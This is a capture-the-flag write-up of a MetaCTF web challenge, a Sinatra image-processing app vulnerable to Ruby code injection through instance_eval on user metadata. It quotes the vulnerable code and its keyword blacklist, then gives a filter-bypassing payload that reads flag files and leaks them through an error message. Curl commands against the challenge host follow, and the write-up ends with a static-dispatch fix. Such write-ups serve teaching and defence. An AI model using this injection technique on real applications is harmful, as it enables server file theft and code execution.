---
title: "PixelPerfect Web Exploitation Write-up"
date: 2026-04-22
categories:
  - Misc
tags:
  - Misc
  - tmp
collections:
  - tmp
---



{{< admonition tldr "TL;DR" >}}

**PixelPerfect Web Exploitation Write-up** is a misc challenge from **tmp**. This challenge exposes a Sinatra-based image processing application that accepts two main inputs:

{{< /admonition >}}

## Summary

This challenge exposes a Sinatra-based image processing application that accepts two main inputs:

1. image file uploaded by the user
2. transformation metadata in `key: value` format 

The main vulnerability lies in the use of `instance_eval` against strings constructed directly from user metadata. Even though the application tries to apply a simple blacklist to the metadata, the implementation still allows Ruby code injection via the `directive` or key metadata section.

In the end, the flag was successfully extracted via the following path:

1. inject Ruby code into the metadata processing pipeline
2. read the flag file from one of the candidate locations
3. insert the contents of the flag into `@output_path` 4. force page `/success` to trigger exception `Errno::ENOENT` 5. take the flag directly from the error message containing the manipulated path

Flag obtained:

```text
MetaCTF{1nst4nc3_3v4l_m4k3s_y0ur_RMagick_g0_b00m}
```

## Targets and Context

Relevant endpoints:

- `GET /upload` displays the upload form
- `POST /process` accepts image files and metadata
- `GET /success` displays the transformation results

The most important file for analysis is `app.rb` .

## Technical Analysis Code

### 1. Metadata is parsed as `key: value` In `app.rb` , metadata is processed line by line:

```ruby
text.each_line do |line|
  next if line.strip.empty?
  key, value = line.split(':', 2)
  metadata[key.strip] = value.strip if key && value
end
```

Consequences:

- left side before `:` becomes `directive` - right side after `:` becomes `value` This means that user control is not only on the value, but also on the name of the directive.

### 2. Blacklisting is not enough to stop code injection

Still in `app.rb` , there is the following filter:

```ruby
if text =~ /system|exec|`|\$|eval|load|require|IO|File|#\{/
  raise "Potentially malicious metadata detected!"
end
```

The problem:

- this filter only searches for a specific substring
- filter does not prevent use of other methods that are still dangerous, such as `read_file` , `Dir[]` , `open` , assignment to instance variables, and string operations
- filters also don't change the fact that user input is still evaluated as Ruby code

### 3. Major vulnerability: `instance_eval` on user input

The most crucial part:

```ruby
@metadata.each do |directive, value|
  Timeout.timeout(30) do
    instance_eval("apply_#{directive}('#{value}')")
  end
end
```

This is the primary sink for remote code execution.

If the user can control `directive` , then the evaluation string can change from its normal form:

```ruby
apply_format('jpg')
```

to be:

```ruby
apply_format('jpg'); <ruby code attacker>; #('x')
```

In other words, `directive` can be used to break the initial method call and add additional Ruby statements.

### 4. There is a file reader helper that can be used directly

The application also provides the following methods:

```ruby
def read_file(path)
  File.read(path)
end
```

This is important because:

- we don't need to call `File.read(...)` directly
- keyword `File` is blocked by the blacklist
- but `read_file(...)` itself is not blocked

### 5. Leak path on page `/success` After processing is complete, the application saves the results:

```ruby
session[:last_image] = processor.output_path.gsub('public/', '')
redirect '/success'
```

Then page `/success` uses those values:

```erb
<%= File.size(File.join("public", image_path)).to_f / 1024 %>KB
```

If `image_path` is manipulated to be a non-existent path, then `File.size(...)` will throw `Errno::ENOENT` , and the exception message will contain the full path attempted. If the path has been filled with flags, the flags will appear in the error message.

## Exploitation Strategy

### Why the initial approach failed

Some seemingly logical approaches turn out to be less stable:

1. raise the flag via `raise` because errors in the `process_image` loop are caught and not immediately returned to the user

2. add new key to `@metadata` this is not always stable because the same hash is being iterated over

3. copy the result file to the name containing the flag
   this requires additional surgery that is not always necessary

The most stable approach is actually simpler:

- read flags
- save flags to `@output_path` - let the `/success` template itself fail when calling `File.size(...)` ### Final payload idea

Payloads must:

1. still producing valid Ruby forms
2. Don't use keywords that are blocked by filters
3. Does not rely on modifying metadata hashes
4. look for flags in several common paths

Payloads used:

```text
format('jpg'); p=(['flag.txt','/flag.txt','/app/flag.txt']+Dir['/*flag*']+Dir['/app/*flag*']+Dir['./*flag*']).find{|x| begin read_file(x); true rescue false end}; f=read_file(p).strip; @output_path='public/processed/'+f; #: x
```

When processed, the application will form an eval string like this:

```ruby
apply_format('jpg'); p=(['flag.txt','/flag.txt','/app/flag.txt']+Dir['/*flag*']+Dir['/app/*flag*']+Dir['./*flag*']).find{|x| begin read_file(x); true rescue false end}; f=read_file(p).strip; @output_path='public/processed/'+f; #('x')
```

Explanation of each section:

- `format('jpg');` make the beginning of a statement valid by calling a method that does exist

- `p=(...)` searches for flag files from several candidate locations

- `read_file(x)` test whether the path can be read

- `f=read_file(p).strip` reads the contents of the flag and removes the newline at the end of the file

- `@output_path='public/processed/'+f` change the output path to a fake path containing the flag

- `#: x` ensures the metadata format remains `key: value` , while making the remainder of the `('x')` string a comment

## Exploitation Methodology

### 1. Save the payload to a file

Using a separate file is safer than typing a long payload directly on the command line, because it avoids quote, line break, and escape character problems.

```bash
cat > payload.txt <<'EOF'
format('jpg'); p=(['flag.txt','/flag.txt','/app/flag.txt']+Dir['/*flag*']+Dir['/app/*flag*']+Dir['./*flag*']).find{|x| begin read_file(x); true rescue false end}; f=read_file(p).strip; @output_path='public/processed/'+f; #: x
EOF
```

### 2. Send request to `/process`

```bash
curl -s -c cookies.txt -b cookies.txt \
  -X POST 'http://hridcy0s.chals.mctf.io/process' \
  -F 'image=@./sample.png;type=image/png' \
  -F 'metadata=<payload.txt' >/dev/null
```

Description:

- `-c cookies.txt` stores new session cookies
- `-b cookies.txt` sends a cookie if the file already exists
- `metadata=<payload.txt` sends file contents as value field `metadata` ### 3. Go to page `/success`

```bash
curl -s -b cookies.txt 'http://hridcy0s.chals.mctf.io/success'
```

The final result:

```text
Errno::ENOENT: No such file or directory @ rb_file_s_size - public/processed/MetaCTF{1nst4nc3_3v4l_m4k3s_y0ur_RMagick_g0_b00m}
```

Flags can be retrieved directly from the error message.

## Why This Payload Works

This exploit works because several design flaws occur together:

1. The user controls the name of the metadata directive
2. directives are installed directly into Ruby strings without escaping
3. the string is executed with `instance_eval` 4. the application provides a helper `read_file` 5. `@output_path` values are trusted up to the `/success` template 
6. The template calls `File.size(...)` without validation that the file actually exists
7. The exception eventually leaks the manipulated path

Practically speaking, it is a combination:

- code injection / Ruby injection
- unsafe dynamic evaluation
- information disclosure through error handling

## Security Impact

This vulnerability is much more serious than just reading flags. With a `instance_eval` primitive like this, an attacker can basically:

- read other sensitive files on the server
- modifying internal object instance variables
- manipulate image processing flow
- potentially executing other primitives available at runtime

If this challenge runs in a real environment, the impact could develop into a full RCE or extensive data exfiltration.

## Root Cause

The root of the problem is not in a less stringent blacklist, but in the following design:

```ruby
instance_eval("apply_#{directive}('#{value}')")
```

As long as applications continue to build Ruby code from user input and then execute it, any blacklist will be fragile and easy to bypass.

## Improvement Recommendations

The correct fix is to remove dynamic evaluation and replace it with static dispatch.

Example of a safe approach:

```ruby
allowed_directives = {
  'format' => :apply_format,
  'resize' => :apply_resize,
  'filter' => :apply_filter,
  'brightness' => :apply_brightness,
  'contrast' => :apply_contrast
}

@metadata.each do |directive, value|
  method_name = allowed_directives[directive]
  next unless method_name
  public_send(method_name, value)
end
```

Recommended hardening additions:

- do not use blacklist as a primary control
- validate `directive` only against allowlist
- escape or sanitize all data entered into the template
- disable detailed exceptions in the production environment
- validate that `image_path` actually points to a valid result file before using it in the view

##Conclusion

This challenge shows a classic but very dangerous vulnerability pattern: dynamic evaluation of user input. Even though the application appears to have a "security filter", using `instance_eval` causes all protection to collapse.

The most stable exploit path is not to force an error from within the processing loop, but rather to utilize the application's normal data flow all the way to the `/success` page, then use the exception path leak as a flag exfiltration channel.

Briefly, the exploit chain is:

1. inject Ruby code via metadata directive
2. read flag file with `read_file(...)` 3. save flags to `@output_path` 4. access `/success` 5. take flag from message `Errno::ENOENT` Challenge solved.
